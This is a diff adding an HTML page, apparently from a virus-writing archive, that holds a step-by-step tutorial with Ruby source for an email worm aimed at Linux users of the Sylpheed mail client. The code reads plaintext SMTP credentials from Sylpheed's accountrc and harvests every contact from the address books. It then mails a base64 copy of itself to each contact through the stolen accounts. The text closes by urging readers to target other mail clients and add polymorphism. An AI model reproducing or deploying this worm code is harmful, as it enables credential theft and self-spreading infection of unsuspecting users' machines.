@@ -1,0 +1,147 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html>
+<head>
+
+<link href="../../viewer/css/style2.css" rel="stylesheet" type="text/css">
+</head>
+
+<body>
+
+<div class="menu">
+<div class="menuitem"><a href="../../viewer/html/sources.html">Return to previous menu</a></div>
+<div class="menuitem"><a target="_blank" href="./sylworm">Navigate to project folder</a></div>
+
+</div>
+
+<div class="title">Ruby.Worm.Sylpheed<br/></div>
+<div class="author">Sephiroth<br/></div>
+
+
+<xmp>
+
+subject            : worm
+spreading-routine  : through email
+target             : linux with Sylpheed
+language           : ruby  
+author             : sephiroth (sephiroth@rbcmail.ru)
+
+
+############### work-flow ################
+
+a.) getting the sylpheed-path
+b.) getting smtp-account data (user,pwd,server) to send our mails through
+c.) getting email addresses to send the worm to
+d.) sending the worm
+e.) adding a simple polymorph encryption
+
+#######################################
+
+### a.) ###
+Well like linux is built it is clear, that the userfiles are stored in the home directory. There all Sylpheed
+versions (2.0-2.4*) own a folder .sylpheed-2.0 . It's always named 2.0 and didn't changed until  now. Getting
+the path to it is quite easy:
+
+         SYLPATH=ENV["HOME"]+"/.sylpheed-2.0/"
+
+We put together the environmental variable "HOME" and the foldername to get the complete path  into  SYLPATH.
+
+
+
+### b.) ###
+The smtp-account data are saved totally unencrypted in the file 'accountrc'  in  the .sylpheed-2.0  folder in
+the home-directory. They are saved with many many additional information we don't wanna  care  about  but  we
+know for sure that all the lines we are interested in begin  with  'address=','smtp_server='and  'password='.
+So let's use the power of rubys regexp to collect these lines and map them into an  array. We  are  gathering
+all account because if one wouldn't work our worm can simply take the next acc to send hisself through:
+
+   Account = Struct.new(:mail_address,:smtp_acc,:pwd)
+   parse_string = /address=(.+?)\n.*?smtp_server=(.+?)\n.*?password=(\w+)/m
+   accounts =File.read("#{SYLPATH}accountrc").scan(parse_string).map { |arr| Account.new(*arr) }
+
+Now we can iterate over the accounts array and take our data like:
+
+    accounts.each do |acc|
+         puts acc.mail_address
+         puts acc.smtp_acc
+         puts acc.pwd
+    end
+
+
+
+### c.) ###
+Getting mail-addresses where we can send our worm to is even easier. We simply read every sylpheed-addressbook
+file which are located in the same folder as the accountrc file and are named addrbook-*.xml, while * is  the
+number of the addressbook between  000001-999999. But  who  has  so  many  addressbooks? No  matter  we  take
+everything which is there:
+
+   adrbk_entries=[]
+   Dir["#{SYLPATH}addrbook*.xml"].each do |file|  
+              File.open(file).each { |line| adrbk_entries<<line.sub(/^.+email="/,'').sub(/" remarks.+$/,'') if line =~ /email=/ }
+   end
+
+We simply take every addrbook*.xml file in the folder and parse it for the lines which  contain  a  "email="
+string which contains of course an email. We clean these lines with regexpr so we just have an email-address
+at the end and put them all again in an array where we later iterate over.
+
+
+
+### d.) ###
+Imo the hardest part. Spreading the worm. Hard because the ruby standardlib net/smtp contains no abstraction
+for sending attachments so we have to code it by hand and give care for the mime-formatting. First the  code
+than the explaination:
+
+  adrbk_entries.each do |emailtosendto|
+           accounts.each do |acc|
+                break if Net::SMTP.start(acc.smtp_acc, 25, 'localhost.localdomain', acc.mail_address,acc.pwd, :login) do |smtp|
+                    smtp.open_message_stream(acc.mail_address,emailtosendto.chomp) do |mailfd|
+                        mailfd.puts "From: #{acc.mail_address}"
+        				mailfd.puts "To: #{emailtosendto.chomp}"
+        				mailfd.puts "Subject: #{subject}"
+        				mailfd.write("MIME-Version:1.0\r\nContent-Type: multipart/mixed; boundary=\"#{boundary}\"\r\n\r\nThis is a multi-part message in MIME format.\r\n\r\n")
+        				mailfd.write("--#{boundary}\r\nContent-Type: text/plain; charset=\"iso-8859-1\"\r\nContent-Transfer-Encoding: 8bit\r\n\r\n#{text}\r\n\r\n--#{boundary}\r\n")
+        				mailfd.write("Content-Type: application/octet-stream; name=\"#{attach_name}\"\r\nContent-Transfer-Encoding: base64\r\n")
+        				mailfd.write("Content-Disposition: attachment; filename=\"#{attach_name}\"\r\n\r\n#{data}\r\n--#{boundary}--\r\n")
+                     end
+                 end
+           end
+   end
+
+So you see two iterations at the beginning. The first (adrbk_entries.each) gives us  everytime  an  email  to
+send our worm to and the second (accounts.each) gives us smtp account data to try out. If the sending process
+was successfull we break out of the accounts iteration (break if Net::SMTP.start....) and take the next email
+to send to. If the sending fails the accounts-iteration gives us new smtp account data to try  to  send. Well
+that's pretty simple. But now comes the hard part, the composing of  a  mime-comform  email. The  three  puts
+lines should speak for themselves. I'm not going to explain now every part of  mime (you  can  read  the  rfc
+yourself) but the things we have to give special attention when coding.
+
+We need a boundary, which is any  value (the best it's random) to  make  a  cutting  line  between  different
+sections within an email. The variable is called boundary above and I'm filling it this way:
+
+            boundary=sprintf("%02X", rand(99999999 - 10000000) + 10000000) + sprintf("%02X", Time.new.to_i) + sprintf("%02X", $$) + sprintf("%02X", Time.new.usec()) 
+
+The other thing to consider is that an attachment needs to be encoded in base64. This is quite easy with ruby.
+We open our own code (we use the global-var $0 which always contains the scriptname) and convert it:
+
+            data = [File.new($0).read()].pack("m*"); 
+
+You should really not mess up with the four mailfd.write lines except you know what you do  because  this  is
+the needed and correct mime arrangment. I struggeld with but works no perfectly.
+
+In the example above you have to fill a subject and a text  variable. Or  you  add  some  arrays  with  these
+informations and randomly select one.
+
+
+
+########### last words ##########
+This is an example in writing a ruby worm which spreads through email. I took sylpheed  as  example  because:
+first I use it and like it much and second because I'm not aware of any  other  worm  which  (ab)uses  it. Of
+course instead of Sylpheed you  could  also  aim  at  Thunderbird, Claws(which  should  be  very  similar  to
+Sylpheed), Enigmail,... and  use  it. Next  to  that  you  wanna  also  check  SPTHs RUBY Virus Writing Guide
+(http://vx.netlux.org/lib/vsp20.html) and add some kind of encryption or even polymorphism to your worm. 
+
+</xmp>
+</div>
+
+</body>
+</html>
